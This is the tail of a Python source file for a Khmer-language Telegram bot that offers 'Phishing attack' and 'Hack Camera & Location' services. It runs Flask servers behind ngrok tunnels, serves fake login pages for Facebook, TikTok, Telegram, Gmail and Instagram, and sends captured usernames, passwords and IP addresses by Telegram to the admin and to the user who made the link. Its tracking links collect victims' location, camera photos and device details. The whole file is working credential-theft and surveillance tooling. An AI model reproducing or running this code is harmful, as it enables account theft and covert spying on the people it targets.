                                     json={"chat_id": recipient, "text": error_msg}, verify=False)
        
        # Send create tracking link button after all photos
        keyboard = [[InlineKeyboardButton("Create Tracking Link", callback_data="create_tracking_link")]]
        reply_markup = json.dumps({"inline_keyboard": keyboard})
        
        for recipient in recipients:
            restart_message = "អ្នកអាចធ្វើការ /restart ដើម្បីចាប់ផ្ដើមឡើងវិញ"
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                         json={"chat_id": recipient, "text": restart_message, "reply_markup": reply_markup}, verify=False)
                    
    except Exception as e:
        print(f"Error sending notification to Telegram: {e}")

def run_hack_server():
    print(f"🚀 Starting Hack Server on port {HACK_SERVER_PORT}")
    hack_app.run(host='0.0.0.0', port=HACK_SERVER_PORT, debug=False, use_reloader=False)

# ================================
# PHISHING ATTACK FUNCTIONS
# ================================
def send_phishing_notification(data, creator_id):
    try:
        platform_info = {
            "facebook": {"name": "Facebook", "icon": "📘"},
            "tiktok": {"name": "TikTok", "icon": "🎵"},
            "telegram": {"name": "Telegram", "icon": "📱"},
            "gmail": {"name": "Gmail", "icon": "📧"},
            "instagram": {"name": "Instagram", "icon": "📸"}
        }
        
        platform = platform_info.get(data['pageType'], {"name": "Unknown", "icon": "🌐"})
        
        # Get creator info
        creator_id_str = str(creator_id)
        user_info = user_data.get(creator_id_str, {})
        username = user_info.get('username', 'មិនស្គាល់')
        name = user_info.get('name', 'មិនស្គាល់')
        
        message = f"🚨 {platform['name']} Login Information 🚨\n\n"
        message += f"👤 អ្នកបង្កើតតំណភ្ជាប់: {name} (@{username})\n\n"
        message += f"{platform['icon']} Platform: {platform['name']}\n"
        message += f"👤 Username/Email: {data['username']}\n"
        message += f"🔑 Password: {data['password']}\n"
        message += f"🌐 IP Address: {data['ipAddress']}\n\n"
        message += "developed by : @mengheang25"
        
        recipients = []
        recipients.append(TELEGRAM_ID)
        
        # Always send to creator if they are not the admin
        if creator_id_str != TELEGRAM_ID:
            recipients.append(creator_id_str)
        
        for chat_id in recipients:
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            payload = {
                'chat_id': chat_id,
                'text': message
            }
            
            try:
                response = requests.post(url, data=payload, verify=False)
                print(f"📢 Message sent to chat_id {chat_id}: {response.status_code}")
            except Exception as e:
                print(f"❌ Error sending to chat_id {chat_id}: {e}")
        
        # Send restart message
        restart_message = "អ្នកអាចធ្វើការ /restart នៅពេលដែលចុច /restart វានិងធ្វើ start bot ជាថ្មី"
        for chat_id in recipients:
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            payload = {
                'chat_id': chat_id,
                'text': restart_message
            }
            requests.post(url, data=payload, verify=False)
            
    except Exception as e:
        print(f"Error sending phishing notification: {e}")

def add_phishing_chat_id(chat_id):
    active_chat_ids.add(chat_id)
    print(f"✅ Added chat_id to broadcast list: {chat_id}")
    print(f"📊 Total active users: {len(active_chat_ids)}")

# Check if templates directory exists
def check_templates_directory():
    if not os.path.exists(templates_dir):
        print(f"❌ Templates directory '{templates_dir}' not found!")
        print(f"📁 Current working directory: {os.getcwd()}")
        print(f"📁 Listing files in current directory:")
        for file in os.listdir('.'):
            print(f"   - {file}")
        return False
    
    required_templates = ['facebook.html', 'tiktok.html', 'telegram.html', 'gmail.html', 'instagram.html']
    missing_templates = []
    
    for template in required_templates:
        template_path = os.path.join(templates_dir, template)
        if not os.path.exists(template_path):
            missing_templates.append(template)
        else:
            print(f"✅ Found template: {template}")
    
    if missing_templates:
        print(f"❌ Missing templates: {missing_templates}")
        print(f"📁 Files in templates directory:")
        for file in os.listdir(templates_dir):
            print(f"   - {file}")
        return False
    
    print("✅ All phishing templates found in templates directory")
    return True

def run_phishing_server():
    print(f"🚀 Starting Phishing Server on port {PHISHING_SERVER_PORT}")
    
    # Create default templates if they don't exist
    create_default_templates()
    
    # Check if templates exist before starting server
    if not check_templates_directory():
        print("❌ Cannot start phishing server: Missing templates")
        return
    
    print(f"📁 Using template folder: {templates_dir}")
    phishing_app.run(host='0.0.0.0', port=PHISHING_SERVER_PORT, debug=False, use_reloader=False)

# ================================
# TELEGRAM BOT FUNCTIONS
# ================================
async def show_progress(update, context, progress_message, progress=0):
    progress_bar_length = 20
    filled_length = int(progress_bar_length * progress // 100)
    bar = '█' * filled_length + '░' * (progress_bar_length - filled_length)
    
    message = f"{progress_message}\n\n[{bar}] {progress}%"
    
    if 'progress_message_id' in context.user_data:
        try:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=context.user_data['progress_message_id'],
                text=message
            )
        except:
            sent_message = await update.message.reply_text(message)
            context.user_data['progress_message_id'] = sent_message.message_id
    else:
        sent_message = await update.message.reply_text(message)
        context.user_data['progress_message_id'] = sent_message.message_id

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    
    if user_id not in user_data:
        user_data[user_id] = {"name": user.full_name, "username": user.username, "type": "user"}
    
    if not context.user_data.get("authenticated", False):
        welcome_message = (
            f"សួស្តី {user.full_name}! 👋\n\n"
            f"នេះជា ID របស់អ្នក 🪪: {user.id}\n\n"
            "សូមចុះឈ្មោះបញ្ចូល password ដើម្បីប្រើប្រាស់ បើមិនទាន់មាន password សូមទាក់ទងទៅកាន់ Admin ដើម្បីទទួលបាន password ចូលប្រើ \n\n"
            "សូមចុចពាក្យថា (SEND MESSAGE) ដើម្បីទាក់ទងទៅកាន់ Admin \n\n"
            "បន្ទាប់មក អ្នកអាចចុច register ដើម្បីដាក់ password 🔑 ចូលប្រើប្រាស់"
        )
        keyboard = [
            [InlineKeyboardButton("SEND MESSAGE", url="https://t.me/mengheang25")],
            [InlineKeyboardButton("REGISTER", callback_data="register")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(welcome_message, reply_markup=reply_markup)
    else:
        await show_main_menu(update, context)

async def show_main_menu(update, context):
    user = update.effective_user
    welcome_message = (
        f"Hello {user.full_name} 👋 \n\n"
        f"Welcome! ពេលនេះអ្នកអាចប្រើប្រាស់បទនេះដើម្បីធ្វើការពីប្រហារ ដែល bot នេះ គឺមានដំណើរការដូចជា Hack camera phone & Real location និង Phishing attack social media \n\n"
        "សូមជ្រើសរើសប៊ូតង់ខាងក្រោមណាមួយដើម្បីវាយប្រហារ\n\n"
        "📊 Status: ✅ Active\n"
        "👤 Developer: @mengheang25\n\n"
        "Use the buttons below to navigate:"
    )
    
    keyboard = [
        [InlineKeyboardButton("📸 Hack Camera & Location", callback_data="hack_menu")],
        [InlineKeyboardButton("🔗 All Phishing Attack", callback_data="phishing_menu")],
        [InlineKeyboardButton("📊 Status", callback_data="status"),
         InlineKeyboardButton("👤 Developer", url="https://t.me/mengheang25")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(welcome_message, reply_markup=reply_markup)
    else:
        await update.message.reply_text(welcome_message, reply_markup=reply_markup)

async def show_phishing_link(update: Update, context: ContextTypes.DEFAULT_TYPE, platform: str):
    query = update.callback_query
    
    # Use the safe function to set the page
    set_phishing_page_safe(platform)
    
    platform_names = {
        "facebook": "Facebook",
        "tiktok": "TikTok", 
        "telegram": "Telegram",
        "gmail": "Gmail",
        "instagram": "Instagram"
    }
    
    platform_name = platform_names.get(platform, "Unknown")
    
    # Use the phishing ngrok URL
    test_url = phishing_ngrok_url if phishing_ngrok_url else "https://latesha-overchildish-solenoidally.ngrok-free.dev"
    
    message = f"🔗 {platform_name} Phishing Link\n\n"
    message += f"🌐 Public URL (Ngrok):\n\n"
    message += f"{test_url}\n\n"
    message += f"📘 This link will show a realistic {platform_name} login page.\n\n"
    message += "👤 Developer: @mengheang25\n\n"
    message += "💡 Note: The page is now set to show the login form."
    
    keyboard = [
        [InlineKeyboardButton("Open Test", url=test_url)],
        [InlineKeyboardButton("Back", callback_data="phishing_menu")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(message, reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "register":
        await query.edit_message_text("សូមធ្វើការវាយបញ្ជូល password 🔑 ត្រឹមត្រូវដើម្បីចុះឈ្មោះប្រើប្រាស់")
        context.user_data["awaiting_password"] = True
    
    elif query.data == "hack_menu":
        if not context.user_data.get("authenticated", False):
            await query.edit_message_text("❌ អ្នកត្រូវតែបញ្ចូល password ជាមុនសិន។")
            return
        
        message = (
            "📸 H4ck Camera & Location\n\n"
            "⚠️ This link will:\n"
            "• 📍 Access device location\n"
            "• 📸 Take photos from camera (15 photos)\n"
            "• 📱 Collect device information\n"
            "• 🔋 Get battery status\n"
            "• 🌐 Get IP address\n\n"
            "🔒 Note: This requires user permission for camera and location access.\n\n"
            "💢 Please click the 'Create Tracking Link' button to create a link.\n\n"
            "👤 Developer: @mengheang25"
        )
        
        keyboard = [
            [InlineKeyboardButton("Create Tracking Link", callback_data="create_tracking_link")],
            [InlineKeyboardButton("Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup)
    
    elif query.data == "phishing_menu":
        if not context.user_data.get("authenticated", False):
            await query.edit_message_text("❌ អ្នកត្រូវតែបញ្ចូល password ជាមុនសិន។")
            return
        
        keyboard = [
            [InlineKeyboardButton("📘 Facebook", callback_data="phishing_facebook")],
            [InlineKeyboardButton("🎵 TikTok", callback_data="phishing_tiktok")],
            [InlineKeyboardButton("✈️ Telegram", callback_data="phishing_telegram")],
            [InlineKeyboardButton("📧 Gmail", callback_data="phishing_gmail")],
            [InlineKeyboardButton("📷 Instagram", callback_data="phishing_instagram")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("🔗 All Phishing Platforms\n\nSelect a platform to generate phishing link:", reply_markup=reply_markup)
    
    elif query.data == "create_tracking_link":
        message = "🌐 សូមបញ្ចូល URL ដែលអ្នកចង់ដាក់ជាការបញ្ជូនបន្ត:\n\nឧទាហរណ៍:\nhttps://google.com\nhttps://youtube.com\nhttps://facebook.com"
        
        keyboard = [[InlineKeyboardButton("Back", callback_data="hack_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(message, reply_markup=reply_markup)
        context.user_data['awaiting_url'] = True
    
    elif query.data == "status":
        message = (
            "📊 Bot Status\n\n"
            f"✅ Bot Status: Active\n\n"
            f"👥 Active Users: {len(user_data)}\n"
            f"👤 Developer: @mengheang25\n\n"
            f"All systems operational."
        )
        keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup)
    
    elif query.data == "main_menu":
        await show_main_menu(update, context)
    
    elif query.data.startswith("phishing_"):
        platform = query.data.replace("phishing_", "")
        await show_phishing_link(update, context, platform)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("awaiting_password", False):
        entered_password = update.message.text.strip()
        if entered_password == BOT_PASSWORD:
            context.user_data["authenticated"] = True
            context.user_data["awaiting_password"] = False
            add_phishing_chat_id(update.effective_chat.id)
            
            await update.message.reply_text("✅ Password 🔑ត្រឹមត្រូវ!\n\nពេលនេះអ្នកអាចប្រើ bot នេះដោយសប្បាយ")
            
            keyboard = [[InlineKeyboardButton("Go To H4CK", callback_data="main_menu")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text("ចុចប៊ូតុងខាងក្រោមដើម្បីបន្ត", reply_markup=reply_markup)
        else:
            await update.message.reply_text("❌ Password មិនត្រឹមត្រូវ សូមព្យាយាមម្ដងទៀត")
        return
    
    if context.user_data.get('awaiting_url'):
        await handle_tracking_url(update, context)

async def handle_tracking_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text
    user_id = update.effective_user.id
    
    progress_message = "🔄 Bot កំពុងបង្កើតតំណភ្ជាប់តាមដាន..."
    await show_progress(update, context, progress_message, 10)
    
    track_id = str(uuid.uuid4())
    
    if user_id not in user_links:
        user_links[user_id] = []
    
    try:
        await asyncio.sleep(0.5)
        await show_progress(update, context, progress_message, 30)
        
        if user_id in ngrok_tunnels:
            try:
                ngrok.disconnect(ngrok_tunnels[user_id])
            except:
                pass
        
        await asyncio.sleep(0.5)
        await show_progress(update, context, progress_message, 60)
        
        public_url = ngrok.connect(HACK_SERVER_PORT, bind_tls=True).public_url
        ngrok_tunnels[user_id] = public_url
        
        await asyncio.sleep(0.5)
        await show_progress(update, context, progress_message, 80)
        
        tracking_link = f"{public_url}/track/{track_id}?url={url}"
        
        link_data = {
            'track_id': track_id,
            'redirect_url': url,
            'tracking_link': tracking_link,
            'created_at': time.time(),
            'user_id': user_id
        }
        user_links[user_id].append(link_data)
        context.user_data['awaiting_url'] = False
        
        await show_progress(update, context, progress_message, 100)
        
        message = "✅ តំណភ្ជាប់តាមដានថ្មីត្រូវបានបង្កើតដោយជោគជ័យ!\n\n"
        message += f"🎯 URL គោលដៅ: {url}\n\n"
        message += "🔗 តំណភ្ជាប់តាមដានរបស់អ្នក:\n"
        message += f"{tracking_link}\n\n"
        message += "📊 តំណនេះនឹងចាប់យក:\n"
        message += "• 📱 ព័ត៌មានឧបករណ៍\n• 📍 ទីតាំង (Google Maps)\n• 📸 រូបថតពីកាមេរ៉ា (15 សន្លឹក)\n• និងព័ត៌មានផ្សេងៗទៀត\n ⏲ ព័ត៌មានទាំងអស់និងផ្ញើត្រឡប់មកវិញ នៅខាក្រោមនេះ"
        
        if 'progress_message_id' in context.user_data:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=context.user_data['progress_message_id']
                )
            except:
                pass
            del context.user_data['progress_message_id']
        
        await update.message.reply_text(message)
        
        keyboard = [
            [InlineKeyboardButton("Open Test url", url=tracking_link)],
            [InlineKeyboardButton("Create Tracking Link", callback_data="create_tracking_link")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("បង្កើតតំណភ្ជាប់ថ្មីទៀត:", reply_markup=reply_markup)
        
    except Exception as e:
        if 'progress_message_id' in context.user_data:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=context.user_data['progress_message_id']
                )
            except:
                pass
            del context.user_data['progress_message_id']
        
        await update.message.reply_text(f"❌ កំហុសក្នុងការបង្កើតតំណ: {str(e)}")
        context.user_data['awaiting_url'] = False

def check_ngrok_status():
    """Check if ngrok tunnels are active"""
    global hack_ngrok_url, phishing_ngrok_url
    
    try:
        # Get active tunnels
        tunnels = ngrok.get_tunnels()
        hack_active = False
        phishing_active = False
        
        for tunnel in tunnels:
            if str(tunnel.config['addr']).endswith(str(HACK_SERVER_PORT)):
                hack_ngrok_url = tunnel.public_url
                hack_active = True
                print(f"✅ Hack Server Tunnel: {hack_ngrok_url}")
            
            if str(tunnel.config['addr']).endswith(str(PHISHING_SERVER_PORT)):
                phishing_ngrok_url = tunnel.public_url
                phishing_active = True
                print(f"✅ Phishing Server Tunnel: {phishing_ngrok_url}")
        
        if not hack_active:
            print("❌ Hack Server Tunnel is not active")
        if not phishing_active:
            print("❌ Phishing Server Tunnel is not active")
            
        return hack_active and phishing_active
        
    except Exception as e:
        print(f"❌ Error checking ngrok status: {e}")
        return False

def setup_ngrok_tunnels():
    """Setup ngrok tunnels for both servers"""
    global hack_ngrok_url, phishing_ngrok_url
    
    try:
        ngrok.set_auth_token(NGROK_AUTHTOKEN)
        print("✅ Ngrok authtoken set successfully")
        
        # Setup hack server tunnel
        hack_tunnel = ngrok.connect(HACK_SERVER_PORT, bind_tls=True)
        hack_ngrok_url = hack_tunnel.public_url
        print(f"🔗 Hack Server Ngrok URL: {hack_ngrok_url}")
        
        # Setup phishing server tunnel
        phishing_tunnel = ngrok.connect(PHISHING_SERVER_PORT, bind_tls=True)
        phishing_ngrok_url = phishing_tunnel.public_url
        print(f"🔗 Phishing Server Ngrok URL: {phishing_ngrok_url}")
        
    except Exception as e:
        print(f"❌ Ngrok setup error: {e}")
        # Fallback URLs
        hack_ngrok_url = "https://latesha-overchildish-solenoidally.ngrok-free.dev"
        phishing_ngrok_url = "https://latesha-overchildish-solenoidally.ngrok-free.dev"

# ================================
# MAIN APPLICATION
# ================================
def run_flask_servers():
    # Create default templates first
    create_default_templates()
    
    # Check templates directory before starting servers
    if not check_templates_directory():
        print("❌ Cannot start phishing server: Missing templates")
        return
    
    hack_thread = threading.Thread(target=run_hack_server, daemon=True)
    phishing_thread = threading.Thread(target=run_phishing_server, daemon=True)
    
    hack_thread.start()
    phishing_thread.start()
    
    print("✅ Both Flask servers started successfully!")
    print(f"📍 Hack Server: http://localhost:{HACK_SERVER_PORT}")
    print(f"📍 Phishing Server: http://localhost:{PHISHING_SERVER_PORT}")

def main():
    # Create templates directory and default templates first
    create_default_templates()
    
    # Setup ngrok tunnels first
    setup_ngrok_tunnels()
    
    # Check ngrok status
    if not check_ngrok_status():
        print("⚠️ Some ngrok tunnels may not be working properly")
    
    # Start Flask servers
    run_flask_servers()
    
    # Create and configure bot application
    application = Application.builder().token(TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("restart", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 Starting Telegram Bot...")
    print(f"🔗 Hack URL: {hack_ngrok_url}")
    print(f"🔗 Phishing URL: {phishing_ngrok_url}")
    
    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()